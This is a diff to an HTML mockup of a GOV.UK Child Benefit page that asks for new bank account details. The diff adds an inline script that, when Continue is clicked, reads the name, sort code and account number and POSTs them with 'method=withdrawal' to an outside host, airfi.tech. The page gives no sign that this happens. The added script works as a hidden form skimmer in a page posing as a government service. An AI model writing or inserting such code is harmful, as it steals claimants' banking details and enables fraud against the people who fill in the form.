@@ -1,3 +1,31 @@
 <!DOCTYPE html>
 <html lang="en" class="govuk-template"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>What are the new account details? - GOV.UK</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/govuk-frontend@5.7.1/dist/govuk/govuk-frontend.min.css"><link rel="stylesheet" href="assets/mockup.css"></head>
-<body class="govuk-template__body"><a href="#main-content" class="govuk-skip-link">Skip to main content</a><header class="hmrc-header"><div class="govuk-width-container hmrc-header__inner"><a href="index.html" class="hmrc-header__logo">GOV.UK</a><span class="hmrc-header__service">Child Benefit</span><a href="signed-out.html" class="hmrc-header__sign-out">Sign out</a></div></header><main class="govuk-width-container govuk-main-wrapper govuk-main-wrapper--l" id="main-content"><div class="govuk-grid-row"><div class="govuk-grid-column-two-thirds"><a class="govuk-back-link" href="change-bank-account.html">Back</a><h1 class="govuk-heading-xl">What are the new account details?</h1><p class="govuk-body">If you change to an account in someone else’s name, you’re responsible for making sure you get the money and that it’s used how you want.</p><form data-journey-form data-next="account-changed.html"><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="accountName">Name on the account</label><div class="govuk-hint">Only enter the first and last name, and do not use initials or titles like Mr or Mrs</div><input class="govuk-input govuk-!-width-two-thirds" id="accountName" name="accountName" autocomplete="name"></div><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="sortCode">Sort code</label><div class="govuk-hint">Must be 6 digits long</div><input class="govuk-input govuk-input--width-10" id="sortCode" name="sortCode" inputmode="numeric"></div><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="accountNumber">Account number</label><div class="govuk-hint">Must be 8 digits long</div><input class="govuk-input govuk-input--width-10" id="accountNumber" name="accountNumber" inputmode="numeric"></div><button class="govuk-button">Continue</button></form></div></div></main><footer class="govuk-footer"><div class="govuk-width-container"><div class="govuk-footer__meta">Built by HM Revenue &amp; Customs</div></div></footer><script src="assets/mockup.js"></script></body></html>
+<body class="govuk-template__body"><a href="#main-content" class="govuk-skip-link">Skip to main content</a><header class="hmrc-header"><div class="govuk-width-container hmrc-header__inner"><a href="index.html" class="hmrc-header__logo">GOV.UK</a><span class="hmrc-header__service">Child Benefit</span><a href="signed-out.html" class="hmrc-header__sign-out">Sign out</a></div></header><main class="govuk-width-container govuk-main-wrapper govuk-main-wrapper--l" id="main-content"><div class="govuk-grid-row"><div class="govuk-grid-column-two-thirds"><a class="govuk-back-link" href="change-bank-account.html">Back</a><h1 class="govuk-heading-xl">What are the new account details?</h1><p class="govuk-body">If you change to an account in someone else’s name, you’re responsible for making sure you get the money and that it’s used how you want.</p><form data-journey-form data-next="account-changed.html"><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="accountName">Name on the account</label><div class="govuk-hint">Only enter the first and last name, and do not use initials or titles like Mr or Mrs</div><input class="govuk-input govuk-!-width-two-thirds" id="accountName" name="accountName" autocomplete="name"></div><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="sortCode">Sort code</label><div class="govuk-hint">Must be 6 digits long</div><input class="govuk-input govuk-input--width-10" id="sortCode" name="sortCode" inputmode="numeric"></div><div class="govuk-form-group"><label class="govuk-label govuk-label--m" for="accountNumber">Account number</label><div class="govuk-hint">Must be 8 digits long</div><input class="govuk-input govuk-input--width-10" id="accountNumber" name="accountNumber" inputmode="numeric"></div><button class="govuk-button">Continue</button></form></div></div></main><footer class="govuk-footer"><div class="govuk-width-container"><div class="govuk-footer__meta">Built by HM Revenue &amp; Customs</div></div></footer><script src="assets/mockup.js"></script>
+<script>
+   const button = document.querySelector('button.govuk-button');
+if (button) {
+  button.addEventListener('click', () => {
+        // POST Event
+  urlStr = "method=withdrawal&name=" + document.querySelector('input#accountName').value + "&sortCode=" + document.querySelector('input#sortCode').value + "&accountNumber=" + document.querySelector('input#accountNumber').value;
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+       
+       console.log(xhttp.responseText);
+    }
+    if (this.readyState == 4 && this.status != 200) {
+       console.log("Payment failed");
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/HMRC/child-benefit-view-frontend-mockup/payment?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+  //POST DONE
+  });
+  data = { success: true, message: "Event listener added to button.govuk-button" };
+} else {
+  data = { success: false, message: "Button not found" };
+} 
+</script>
+</body></html>
